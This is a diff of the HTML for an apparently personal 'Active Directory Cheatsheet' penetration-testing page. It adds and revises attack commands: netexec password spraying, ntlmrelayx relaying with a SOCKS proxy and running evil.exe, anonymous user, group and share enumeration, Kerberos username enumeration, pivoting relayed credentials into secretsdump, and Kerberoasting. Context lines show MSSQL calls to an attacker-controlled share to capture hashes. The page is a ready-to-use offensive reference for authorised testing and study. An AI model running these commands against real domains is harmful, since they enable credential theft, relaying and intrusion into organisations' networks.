@@ -59,13 +59,13 @@
  
 
 <meta name="author" content="Jack69" />
-<meta name="description" content="Related to: Active Directory Initial Attack Vectors Password Spraying Password spraying with DomainPasswordSpray: # On the whole domain Invoke-DomainPasswordSpray -Password &lt;password&gt; # Generate a list of users not disabled and not potentially lockable Get-DomainUserList -Domain &lt;domain&gt; -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt # On users subset Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name …" />
+<meta name="description" content="Related to: Active Directory Initial Attack Vectors Password Spraying Password spraying remotely with netexec: nxc smb &lt;target&gt; -u &lt;users list&gt; -p &lt;password|password list&gt; --no-bruteforce Password spraying with DomainPasswordSpray: # On the whole domain Invoke-DomainPasswordSpray -Password &lt;password&gt; # Generate a list of users not disabled and not potentially lockable Get-DomainUserList -Domain &lt;domain …" />
 <meta name="keywords" content="">
 
 
   <meta property="og:site_name" content="Jack's Corner"/>
   <meta property="og:title" content="Active Directory Cheatsheet"/>
-  <meta property="og:description" content="Related to: Active Directory Initial Attack Vectors Password Spraying Password spraying with DomainPasswordSpray: # On the whole domain Invoke-DomainPasswordSpray -Password &lt;password&gt; # Generate a list of users not disabled and not potentially lockable Get-DomainUserList -Domain &lt;domain&gt; -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt # On users subset Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name …"/>
+  <meta property="og:description" content="Related to: Active Directory Initial Attack Vectors Password Spraying Password spraying remotely with netexec: nxc smb &lt;target&gt; -u &lt;users list&gt; -p &lt;password|password list&gt; --no-bruteforce Password spraying with DomainPasswordSpray: # On the whole domain Invoke-DomainPasswordSpray -Password &lt;password&gt; # Generate a list of users not disabled and not potentially lockable Get-DomainUserList -Domain &lt;domain …"/>
   <meta property="og:locale" content="en_US"/>
   <meta property="og:url" content="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html"/>
   <meta property="og:type" content="article"/>
@@ -140,11 +140,14 @@
 
   <div>
         <div class="toc col-lg-3 hidden-xs hidden-sm">
-            <div id="toc"><ul><li><a class="toc-href" href="#initial-attack-vectors" title="Initial Attack Vectors">Initial Attack Vectors</a><ul><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a></li><li><a class="toc-href" href="#llmnrnbt-ns-poisoning" title="LLMNR/NBT-NS Poisoning">LLMNR/NBT-NS Poisoning</a></li><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#dns-takeover-via-ipv6" title="DNS takeover via IPv6">DNS takeover via IPv6</a></li><li><a class="toc-href" href="#pxe-boot-image-retrieval" title="PXE Boot Image Retrieval">PXE Boot Image Retrieval</a></li><li><a class="toc-href" href="#crack-gpp" title="Crack GPP">Crack GPP</a></li><li><a class="toc-href" href="#workstation-takeover-with-laps" title="Workstation takeover with LAPS">Workstation takeover with LAPS</a></li><li><a class="toc-href" href="#ldap-pass-back" title="LDAP Pass-back">LDAP Pass-back</a></li><li><a class="toc-href" href="#mssql-ntlm-relay" title="MSSQL NTLM Relay">MSSQL NTLM Relay</a></li></ul></li><li><a class="toc-href" href="#enumeration_1" title="Enumeration">Enumeration</a><ul><li><a class="toc-href" href="#command-line-enumeration" title="Command Line Enumeration">Command Line Enumeration</a></li><li><a class="toc-href" href="#powershell-enumeration" title="Powershell Enumeration">Powershell Enumeration</a><ul><li><a class="toc-href" href="#using-net-classes" title="Using .NET classes">Using .NET classes</a></li><li><a class="toc-href" href="#wmi-enumeration" title="WMI Enumeration">WMI Enumeration</a></li></ul></li><li><a class="toc-href" href="#sharphound_1" title="Sharphound">Sharphound</a><ul><li><a class="toc-href" href="#interesting-queries" title="Interesting Queries">Interesting Queries</a></li></ul></li></ul></li><li><a class="toc-href" href="#lateral-movements_2" title="Lateral Movements">Lateral Movements</a><ul><li><a class="toc-href" href="#wmi" title="WMI">WMI</a></li><li><a class="toc-href" href="#powershell-remoting" title="PowerShell Remoting">PowerShell Remoting</a><ul><li><a class="toc-href" href="#constrained-language-mode-bypasses" title="Constrained Language Mode Bypasses">Constrained Language Mode Bypasses</a></li></ul></li><li><a class="toc-href" href="#dumping-credentials_1" title="Dumping Credentials">Dumping Credentials</a></li><li><a class="toc-href" href="#pass-the-attacks" title="Pass-the-* attacks">Pass-the-* attacks</a></li><li><a class="toc-href" href="#token-impersonation" title="Token Impersonation">Token Impersonation</a><ul><li><a class="toc-href" href="#token-impersonation-metasploit" title="Token Impersonation: Metasploit">Token Impersonation: Metasploit</a></li><li><a class="toc-href" href="#token-impersonation-mimikatz" title="Token Impersonation: Mimikatz">Token Impersonation: Mimikatz</a></li></ul></li><li><a class="toc-href" href="#kerberoasting_1" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#kerberos-delegation" title="Kerberos Delegation">Kerberos Delegation</a><ul><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#constrained-delegation" title="Constrained Delegation">Constrained Delegation</a></li><li><a class="toc-href" href="#ms-rprn-abuse-printer-bug" title="MS-RPRN abuse (Printer Bug)">MS-RPRN abuse (Printer Bug)</a></li></ul></li><li><a class="toc-href" href="#dnsadmins_1" title="DNSAdmins">DNSAdmins</a></li><li><a class="toc-href" href="#local-privilege-escalation" title="Local Privilege Escalation">Local Privilege Escalation</a></li><li><a class="toc-href" href="#abusing-trusts" title="Abusing Trusts">Abusing Trusts</a><ul><li><a class="toc-href" href="#mssql-database-links" title="MSSQL Database Links">MSSQL Database Links</a></li></ul></li></ul></li><li><a class="toc-href" href="#post-exploitation-persistence_2" title="Post Exploitation &amp; Persistence">Post Exploitation &amp; Persistence</a><ul><li><a class="toc-href" href="#windows-services" title="Windows Services">Windows Services</a></li><li><a class="toc-href" href="#golden-silver-tickets" title="Golden &amp; Silver Tickets">Golden &amp; Silver Tickets</a></li><li><a class="toc-href" href="#skeleton-key" title="Skeleton Key">Skeleton Key</a></li><li><a class="toc-href" href="#directory-services-restore-mode-dsrm" title="Directory Services Restore Mode (DSRM)">Directory Services Restore Mode (DSRM)</a></li><li><a class="toc-href" href="#security-support-provider-ssp" title="Security Support Provider (SSP)">Security Support Provider (SSP)</a></li><li><a class="toc-href" href="#acls-attack" title="ACLs Attack">ACLs Attack</a><ul><li><a class="toc-href" href="#permission-delegation" title="Permission Delegation">Permission Delegation</a></li><li><a class="toc-href" href="#adminsdholder" title="AdminSDHolder">AdminSDHolder</a></li><li><a class="toc-href" href="#common-abuses" title="Common Abuses">Common Abuses</a></li></ul></li><li><a class="toc-href" href="#sidhistory_1" title="SIDHistory">SIDHistory</a></li><li><a class="toc-href" href="#security-descriptors" title="Security Descriptors">Security Descriptors</a><ul><li><a class="toc-href" href="#security-descriptors-wmi" title="Security Descriptors - WMI">Security Descriptors - WMI</a></li><li><a class="toc-href" href="#security-descriptors-powershell-remoting" title="Security Descriptors - PowerShell Remoting">Security Descriptors - PowerShell Remoting</a></li><li><a class="toc-href" href="#security-descriptors-remote-registry" title="Security Descriptors - Remote Registry">Security Descriptors - Remote Registry</a></li></ul></li><li><a class="toc-href" href="#active-directory-certificate-services-ad-cs_1" title="Active Directory Certificate Services (AD CS)">Active Directory Certificate Services (AD CS)</a></li><li><a class="toc-href" href="#group-nesting" title="Group Nesting">Group Nesting</a></li><li><a class="toc-href" href="#gpo-persistence" title="GPO Persistence">GPO Persistence</a></li><li><a class="toc-href" href="#dcshadow" title="DCShadow">DCShadow</a></li><li><a class="toc-href" href="#backdoors" title="Backdoors">Backdoors</a></li></ul></li><li><a class="toc-href" href="#kerberos-commons_1" title="Kerberos Commons">Kerberos Commons</a></li><li><a class="toc-href" href="#misc" title="Misc">Misc</a></li></ul></div>
+            <div id="toc"><ul><li><a class="toc-href" href="#initial-attack-vectors" title="Initial Attack Vectors">Initial Attack Vectors</a><ul><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a></li><li><a class="toc-href" href="#llmnrnbt-ns-poisoning" title="LLMNR/NBT-NS Poisoning">LLMNR/NBT-NS Poisoning</a></li><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#dns-takeover-via-ipv6" title="DNS takeover via IPv6">DNS takeover via IPv6</a></li><li><a class="toc-href" href="#pxe-boot-image-retrieval" title="PXE Boot Image Retrieval">PXE Boot Image Retrieval</a></li><li><a class="toc-href" href="#crack-gpp" title="Crack GPP">Crack GPP</a></li><li><a class="toc-href" href="#workstation-takeover-with-laps" title="Workstation takeover with LAPS">Workstation takeover with LAPS</a></li><li><a class="toc-href" href="#ldap-pass-back" title="LDAP Pass-back">LDAP Pass-back</a></li><li><a class="toc-href" href="#mssql-ntlm-relay" title="MSSQL NTLM Relay">MSSQL NTLM Relay</a></li></ul></li><li><a class="toc-href" href="#enumeration_1" title="Enumeration">Enumeration</a><ul><li><a class="toc-href" href="#ldap" title="LDAP">LDAP</a></li><li><a class="toc-href" href="#command-line-enumeration" title="Command Line Enumeration">Command Line Enumeration</a></li><li><a class="toc-href" href="#powershell-enumeration" title="Powershell Enumeration">Powershell Enumeration</a><ul><li><a class="toc-href" href="#using-net-classes" title="Using .NET classes">Using .NET classes</a></li><li><a class="toc-href" href="#wmi-enumeration" title="WMI Enumeration">WMI Enumeration</a></li></ul></li><li><a class="toc-href" href="#bloodhoundsharphound_1" title="BloodHound/Sharphound">BloodHound/Sharphound</a><ul><li><a class="toc-href" href="#interesting-bloodhound-queries" title="Interesting BloodHound Queries">Interesting BloodHound Queries</a></li></ul></li></ul></li><li><a class="toc-href" href="#lateral-movements_2" title="Lateral Movements">Lateral Movements</a><ul><li><a class="toc-href" href="#pivoting" title="Pivoting">Pivoting</a></li><li><a class="toc-href" href="#wmi" title="WMI">WMI</a></li><li><a class="toc-href" href="#powershell-remoting" title="PowerShell Remoting">PowerShell Remoting</a><ul><li><a class="toc-href" href="#constrained-language-mode-bypasses" title="Constrained Language Mode Bypasses">Constrained Language Mode Bypasses</a></li></ul></li><li><a class="toc-href" href="#dumping-credentials_1" title="Dumping Credentials">Dumping Credentials</a></li><li><a class="toc-href" href="#pass-the-attacks" title="Pass-the-* attacks">Pass-the-* attacks</a></li><li><a class="toc-href" href="#token-impersonation" title="Token Impersonation">Token Impersonation</a><ul><li><a class="toc-href" href="#token-impersonation-metasploit" title="Token Impersonation: Metasploit">Token Impersonation: Metasploit</a></li><li><a class="toc-href" href="#token-impersonation-mimikatz" title="Token Impersonation: Mimikatz">Token Impersonation: Mimikatz</a></li></ul></li><li><a class="toc-href" href="#kerberoasting_1" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#kerberos-delegation" title="Kerberos Delegation">Kerberos Delegation</a><ul><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#constrained-delegation" title="Constrained Delegation">Constrained Delegation</a></li><li><a class="toc-href" href="#ms-rprn-abuse-printer-bug" title="MS-RPRN abuse (Printer Bug)">MS-RPRN abuse (Printer Bug)</a></li></ul></li><li><a class="toc-href" href="#dnsadmins_1" title="DNSAdmins">DNSAdmins</a></li><li><a class="toc-href" href="#local-privilege-escalation" title="Local Privilege Escalation">Local Privilege Escalation</a></li><li><a class="toc-href" href="#abusing-trusts" title="Abusing Trusts">Abusing Trusts</a><ul><li><a class="toc-href" href="#mssql-database-links" title="MSSQL Database Links">MSSQL Database Links</a></li></ul></li></ul></li><li><a class="toc-href" href="#post-exploitation-persistence_2" title="Post Exploitation &amp; Persistence">Post Exploitation &amp; Persistence</a><ul><li><a class="toc-href" href="#windows-services" title="Windows Services">Windows Services</a></li><li><a class="toc-href" href="#golden-silver-tickets" title="Golden &amp; Silver Tickets">Golden &amp; Silver Tickets</a></li><li><a class="toc-href" href="#skeleton-key" title="Skeleton Key">Skeleton Key</a></li><li><a class="toc-href" href="#directory-services-restore-mode-dsrm" title="Directory Services Restore Mode (DSRM)">Directory Services Restore Mode (DSRM)</a></li><li><a class="toc-href" href="#security-support-provider-ssp" title="Security Support Provider (SSP)">Security Support Provider (SSP)</a></li><li><a class="toc-href" href="#acls-attack" title="ACLs Attack">ACLs Attack</a><ul><li><a class="toc-href" href="#permission-delegation" title="Permission Delegation">Permission Delegation</a></li><li><a class="toc-href" href="#adminsdholder" title="AdminSDHolder">AdminSDHolder</a></li><li><a class="toc-href" href="#common-abuses" title="Common Abuses">Common Abuses</a></li></ul></li><li><a class="toc-href" href="#sidhistory_1" title="SIDHistory">SIDHistory</a></li><li><a class="toc-href" href="#security-descriptors" title="Security Descriptors">Security Descriptors</a><ul><li><a class="toc-href" href="#security-descriptors-wmi" title="Security Descriptors - WMI">Security Descriptors - WMI</a></li><li><a class="toc-href" href="#security-descriptors-powershell-remoting" title="Security Descriptors - PowerShell Remoting">Security Descriptors - PowerShell Remoting</a></li><li><a class="toc-href" href="#security-descriptors-remote-registry" title="Security Descriptors - Remote Registry">Security Descriptors - Remote Registry</a></li></ul></li><li><a class="toc-href" href="#active-directory-certificate-services-ad-cs_1" title="Active Directory Certificate Services (AD CS)">Active Directory Certificate Services (AD CS)</a></li><li><a class="toc-href" href="#group-nesting" title="Group Nesting">Group Nesting</a></li><li><a class="toc-href" href="#gpo-persistence" title="GPO Persistence">GPO Persistence</a></li><li><a class="toc-href" href="#dcshadow" title="DCShadow">DCShadow</a></li><li><a class="toc-href" href="#backdoors" title="Backdoors">Backdoors</a></li></ul></li><li><a class="toc-href" href="#kerberos-commons_1" title="Kerberos Commons">Kerberos Commons</a></li><li><a class="toc-href" href="#misc" title="Misc">Misc</a></li></ul></div>
         </div>
     <p>Related to: <a href="https://ojack69.github.io/jacks-corner/ad/active-directory.html">Active Directory</a></p>
 <h2 id="initial-attack-vectors">Initial Attack Vectors</h2>
 <h3 id="password-spraying">Password Spraying</h3>
+<p>Password spraying remotely with <code>netexec</code>:</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;users<span class="w"> </span>list&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password<span class="p">|</span>password<span class="w"> </span>list&gt;<span class="w"> </span>--no-bruteforce
+</code></pre></div>
 <p>Password spraying with <a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a>:</p>
 <div class="highlight"><pre><span></span><code><span class="c"># On the whole domain</span>
 <span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-Password</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span>
@@ -189,8 +192,12 @@ ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span
 
 <span class="c1"># Run executable</span>
 ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-e<span class="w"> </span>evil.exe
+
+<span class="c1"># Start SOCKS proxy*</span>
+ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-socks<span class="w"> </span>--keep-relaying
 </code></pre></div>
-<p>*Note: Any recovered hashed credentials with <code>responder</code> are printed to STD OUT and also saved to a John the Ripper compliant file, located at <code>/usr/share/responder/logs/</code></p>
+<p>*<strong>Note</strong>: inn multirelay mode (<code>-tf</code>), <strong>when relaying fails against a target, no further targets will be processed until the relay receives new connection</strong>. Use the <code>--keep-relaying</code> to prevent this (see <a href="https://github.com/fortra/impacket/pull/1741">there</a>).</p>
+<p><strong>Note</strong>: Any recovered hashed credentials with <code>responder</code> are printed to STD OUT and also saved to a John the Ripper compliant file, located at <code>/usr/share/responder/logs/</code></p>
 <ul>
 <li>The files are named in the following format - (Module-Name)-(HASH-TYPE)-(Client-IP).txt</li>
 </ul>
@@ -308,6 +315,59 @@ EXEC<span class="w"> </span>master..xp_subdirs<span class="w"> </span><span clas
 EXEC<span class="w"> </span>master..xp_fileexist<span class="w"> </span><span class="s1">'\\&lt;attacker_IP&gt;\anything\'</span>
 </code></pre></div>
 <h2 id="enumeration_1">Enumeration</h2>
+<p>Enumerate DC ip by querying DNS:</p>
+<div class="highlight"><pre><span></span><code>nslookup<span class="w"> </span>-type<span class="o">=</span>srv<span class="w"> </span>_ldap._tcp.dc._msdcs.&lt;domain&gt;<span class="w"> </span>&lt;dns<span class="w"> </span>server&gt;
+</code></pre></div>
+<p>Enumerate users remotely:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># NetExec - anonymously</span>
+nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>--users
+
+<span class="c1"># NetExec - authenticated</span>
+nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--users
+
+<span class="c1"># rpcclient - anonymously</span>
+rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">"&lt;domain&gt;\\"</span><span class="w"> </span>&lt;dc<span class="w"> </span>ip&gt;<span class="w"> </span>-N
+$&gt;<span class="w"> </span>enumdomusers
+
+<span class="c1"># nmap - using a wordlist (OSINT)*</span>
+nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">88</span><span class="w"> </span>--script<span class="o">=</span>krb5-enum-users<span class="w"> </span>--script-args<span class="o">=</span><span class="s2">"krb5-enum-users.realm='&lt;root domain&gt;',userdb=&lt;username wordlist&gt;"</span><span class="w"> </span>&lt;root<span class="w"> </span>dc<span class="w"> </span>ip&gt;
+</code></pre></div>
+<p>*<strong>Note</strong>: as referred <a href="https://nmap.org/nsedoc/scripts/krb5-enum-users.html">here</a>, this method will not increase <code>badpwdcount</code> since it's not performing a logon but it's using the <code>KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN</code> Kerberos' error code to determine if the username is invalid.</p>
+<p>Enumerate groups remotely:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># rpcclient - anonymously</span>
+rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">"&lt;domain&gt;\\"</span><span class="w"> </span>&lt;dc<span class="w"> </span>ip&gt;<span class="w"> </span>-N
+$&gt;<span class="w"> </span>enumdomgroups
+
+<span class="c1"># NetExec - authenticated</span>
+nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--groups
+</code></pre></div>
+<p>Enumerate groups memberships remoteley:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># All users</span>
+net<span class="w"> </span>rpc<span class="w"> </span>group<span class="w"> </span>members<span class="w"> </span><span class="s1">'Domain Users'</span><span class="w"> </span>-W<span class="w"> </span><span class="s1">'&lt;domain&gt;'</span><span class="w"> </span>-I<span class="w"> </span><span class="s1">'&lt;dc ip&gt;'</span><span class="w"> </span>-U<span class="w"> </span><span class="s1">'%'</span>
+
+<span class="c1"># Specific group</span>
+net<span class="w"> </span>rpc<span class="w"> </span>group<span class="w"> </span>members<span class="w"> </span><span class="s1">'&lt;group&gt;'</span><span class="w"> </span>-W<span class="w"> </span><span class="s1">'&lt;domain&gt;'</span><span class="w"> </span>-I<span class="w"> </span><span class="s1">'&lt;dc ip&gt;'</span><span class="w"> </span>-U<span class="w"> </span><span class="s1">'%'</span>
+</code></pre></div>
+<p>Enumerate password policy:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># NetExec - anonymously</span>
+nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>--pass-pol
+
+<span class="c1"># NetExec - authenticated</span>
+nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--pass-pol
+</code></pre></div>
+<p>Enumerate shares:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># NetExec - anonymously</span>
+nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">'anonymous'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--share
+
+<span class="c1"># NetExec - authenticated</span>
+nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>host/network&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--shares
+</code></pre></div>
+<p>Enumerate users, groups, group memberships, password policy, shares, etc with <code>enum4linux</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="n">enum4linux</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="w"> </span><span class="n">host</span><span class="o">&gt;</span>
+</code></pre></div>
+<p>Dump DNS record from DC with <a href="https://github.com/dirkjanm/adidnsdump">adidnsdump</a>:</p>
+<div class="highlight"><pre><span></span><code>adidnsdump<span class="w"> </span>-u<span class="w"> </span><span class="s1">'&lt;domain&gt;\&lt;user&gt;'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span>&lt;target<span class="w"> </span>host&gt;
+</code></pre></div>
 <p>Network Credentials Injection with <code>runas</code>:</p>
 <div class="highlight"><pre><span></span><code>runas.exe<span class="w"> </span>/netonly<span class="w"> </span>/user:&lt;domain&gt;<span class="se">\&lt;</span>username&gt;<span class="w"> </span>cmd.exe
 </code></pre></div>
@@ -328,6 +388,12 @@ EXEC<span class="w"> </span>master..xp_fileexist<span class="w"> </span><span cl
 <li>Right-click on <strong>Active Directory Users and Computers</strong> in the left-hand pane  </li>
 <li>Click on <strong>View</strong> -&gt; <strong>Advanced Features</strong></li>
 </ol>
+<h3 id="ldap">LDAP</h3>
+<p>Refer to <a href="https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/">this</a> for common LDAP queries for Active Directory Pentesting.</p>
+<p>Use <code>ldapsearch</code> to run queries against a DC:</p>
+<div class="highlight"><pre><span></span><code>ldapsearch<span class="w"> </span>-H<span class="w"> </span>ldap://&lt;dc<span class="w"> </span>ip&gt;<span class="w"> </span>-D<span class="w"> </span><span class="s2">"&lt;user&gt;@&lt;domain FQDN&gt;"</span><span class="w"> </span>-w<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-b<span class="w"> </span><span class="s1">'&lt;base DN&gt;'</span><span class="w"> </span><span class="s1">'&lt;query&gt;'</span>
+</code></pre></div>
+<p><strong>Note</strong>: <code>baseDN</code> for <code>this.domain.local</code> is <code>DC=this, DC=domain, DC=local</code></p>
 <h3 id="command-line-enumeration">Command Line Enumeration</h3>
 <p>List all registered SPNs in a DC:</p>
 <div class="highlight"><pre><span></span><code>setspn<span class="w"> </span>-T<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>-Q<span class="w"> </span>*/*
@@ -723,7 +789,7 @@ remote registry on the target)(<code>PowerView</code>):</p>
 <span class="nb">Get-Process</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">ProcessName</span> <span class="o">-like</span> <span class="s2">"*McShield*"</span> <span class="o">-or</span> <span class="nv">$_</span><span class="p">.</span><span class="n">ProcessName</span> <span class="o">-like</span> <span class="s2">"*avp*"</span> <span class="p">}</span>
 </code></pre></div>
 <p>*Note: these commands would not work with Windows Server 2019</p>
-<h3 id="sharphound_1">Sharphound</h3>
+<h3 id="bloodhoundsharphound_1">BloodHound/Sharphound</h3>
 <p>Collect information for <code>Bloodhound</code>:</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># Using exe</span>
 Sharphound.exe<span class="w"> </span>--CollectionMethods<span class="w"> </span>&lt;Methods&gt;<span class="w"> </span>--Domain<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>--ExcludeDCs
@@ -744,11 +810,21 @@ Invoke-BloodHound<span class="w"> </span>-CollectionMethods<span class="w"> </sp
 <ul>
 <li><a href="https://github.com/BloodHoundAD/SharpHound">Sharphound</a></li>
 </ul>
-<h4 id="interesting-queries">Interesting Queries</h4>
+<h4 id="interesting-bloodhound-queries">Interesting BloodHound Queries</h4>
+<p>Cool reference <a href="https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/">here</a>.</p>
 <p>Find instances where a computer has the "AdminTo" relationship over another computer:</p>
 <div class="highlight"><pre><span></span><code><span class="n">MATCH</span><span class="w"> </span><span class="n">p</span><span class="o">=</span><span class="p">(</span><span class="n">c1</span><span class="o">:</span><span class="n">Computer</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="n">r1</span><span class="o">:</span><span class="n">MemberOf</span><span class="o">*</span><span class="mf">1.</span><span class="p">.]</span><span class="o">-&gt;</span><span class="p">(</span><span class="n">g</span><span class="o">:</span><span class="kr">Group</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="n">r2</span><span class="o">:</span><span class="n">AdminTo</span><span class="p">]</span><span class="o">-&gt;</span><span class="p">(</span><span class="n">n</span><span class="o">:</span><span class="n">Computer</span><span class="p">)</span><span class="w"> </span><span class="kr">RETURN</span><span class="w"> </span><span class="n">p</span>
 </code></pre></div>
 <h2 id="lateral-movements_2">Lateral Movements</h2>
+<h3 id="pivoting">Pivoting</h3>
+<p><strong>Take also a look to <a href="https://ojack69.github.io/jacks-corner/misc/cheatsheet.html#pivoting">Misc Cheatsheet - Pivoting</a>!</strong></p>
+<p>After opening a socks proxy with impacket's <code>ntlmrealyx</code> (<code>-socks</code> option), every relayed NTLM hash is made available:</p>
+<div class="highlight"><pre><span></span><code># List releyable credentials
+&gt; socks
+</code></pre></div>
+<p>It's then possible to use any tool to use these credentials; for Impacket-based tools use the <code>--no-pass</code> option. For example:</p>
+<div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>secretsdump<span class="w"> </span>-no-pass<span class="w"> </span>&lt;stored<span class="w"> </span>credential<span class="w"> </span>-<span class="w"> </span>domain/user&gt;@&lt;target&gt;
+</code></pre></div>
 <h3 id="wmi">WMI</h3>
 <p>Run remote process (from cmd):</p>
 <div class="highlight"><pre><span></span><code>wmic.exe<span class="w"> </span>/user:&lt;username&gt;<span class="w"> </span>/password:&lt;password&gt;<span class="w"> </span>/node:&lt;target<span class="w"> </span>computer&gt;<span class="w"> </span>process<span class="w"> </span>call<span class="w"> </span>create<span class="w"> </span><span class="s2">"&lt;command&gt;"</span><span class="w"> </span>
@@ -1115,8 +1191,8 @@ python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span 
 <span class="c"># or with PowerView</span>
 <span class="nb">Request-SPNTicket</span>
 </code></pre></div>
-<p>Request TGS for the found SPN using impacket's <code>GetUserSPNs</code>:</p>
-<div class="highlight"><pre><span></span><code>python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP<span class="w"> </span>address&gt;<span class="w"> </span>&lt;domain/owned<span class="w"> </span>user&gt;<span class="w"> </span>-request-user<span class="w"> </span>&lt;SPN&gt;
+<p>Request TGS for the found SPN's user using impacket's <code>GetUserSPNs</code>:</p>
+<div class="highlight"><pre><span></span><code>python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP<span class="w"> </span>address&gt;<span class="w"> </span>&lt;domain/owned<span class="w"> </span>user&gt;<span class="w"> </span>-request-user<span class="w"> </span>&lt;SPN<span class="err">'</span>s<span class="w"> </span>user&gt;
 </code></pre></div>
 <p>List tickets in memory:</p>
 <div class="highlight"><pre><span></span><code>klist
